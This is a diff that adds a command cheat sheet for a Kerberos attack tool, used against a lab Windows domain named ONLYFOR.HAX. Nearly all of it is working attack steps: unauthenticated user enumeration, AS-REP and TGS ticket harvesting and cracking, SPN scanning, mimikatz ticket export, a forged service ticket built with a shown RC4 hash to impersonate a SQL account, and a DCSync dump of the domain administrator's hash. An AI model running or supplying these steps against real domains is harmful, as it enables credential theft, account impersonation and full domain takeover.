@@ -1,0 +1,105 @@
+Enumerate Users - No auth
+
+set domain ONLYFOR.HAX
+set dc dc.onlyfor.hax
+set userlist userlist.txt
+brute_no_pre_auth
+
+Recover Interactively - No auth req'd
+
+set domain ONLYFOR.HAX
+set dc dc.onlyfor.hax
+set username w
+net_get_as_rep
+
+Recover PCAP
+
+set pcap samples/sample.krb.pcap
+pcap_get_tickets
+
+Crack Accounts
+
+set pcap samples/sample.krb.pcap
+pcap_get_tickets
+
+set domain ONLYFOR.HAX
+set dc dc.onlyfor.hax
+set userlist userlist.txt
+brute_no_pre_auth
+
+set wordlist wordlist.txt
+
+crack_as_rep_manual 0
+
+crack_tgs_rep_manual 8
+
+crack_as_rep
+
+crack_tgs_rep
+
+crack_tickets
+
+Portscan the Domain
+set username w
+set password wP@$$w0rd1
+set domain ONLYFOR.HAX
+set dc dc.onlyfor.hax
+scan_spn
+
+Find accounts with "Do not use Kerberos Pre-Authentication" and get AS-REPs for them
+
+set username w
+set password wP@$$w0rd1
+set domain ONLYFOR.HAX
+set dc dc.onlyfor.hax
+scan_ldap_no_pre_auth
+
+Recover Interactively - Auth req'd
+
+set username w
+set password wP@$$w0rd1
+set domain ONLYFOR.HAX
+set dc dc.onlyfor.hax
+set target_service MSSQLSvc/DomainW7.onlyfor.hax:1433
+net_get_tgs_rep
+set wordlist wordlist.txt
+crack_tickets
+
+
+Windows
+
+SPN Scan
+
+Config DNS -> Domain Controller (dc.onyfor.hax)
+runas /netonly /user:w@onlyfor.hax cmd.exe
+setspn -T onlyfor.hax -Q */*
+
+
+Get TGT
+
+powershell
+Add-Type -AssemblyName System.IdentityModel  
+PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DomainW7.onlyfor.hax:1433" 
+
+
+Export Tickets
+
+mimikatz "kerberos::list /export" exit
+
+
+Impersonate user
+
+"c:\Program Files\Microsoft SQL Server\110\Tools\Binn\SQLCMD.EXE" -S domainw7.onlyfor.hax
+runas /netonly /user:sqlsa@onlyfor.hax cmd.exe
+c:\users\user\Desktop\Tricks\mimikatz.exe "kerberos::golden /sid:S-1-5-21-2556115776-1061989169-2417088117 /domain:ONLYFOR.HAX /ptt /id:1113 /target:DomainW7.onlyfor.hax:1433 /service:MSSQLSvc /rc4:99D0F1CF2C2A3A46D7BC5DB23C9BFE54 /user:sqlsa@onlyfor.hax" exit
+tsql 
+"c:\Program Files\Microsoft SQL Server\110\Tools\Binn\SQLCMD.EXE" -S domainw7.onlyfor.hax
+
+select SYSTEM_USER;
+go
+
+Dump Domain Hashes
+
+runas /netonly /user:sqlsvcacct@onlyfor.hax cmd.exe
+c:\users\user\Desktop\Tricks\mimikatz.exe 
+lsadump::dcsync /domain:onlyfor.hax /user:administrator
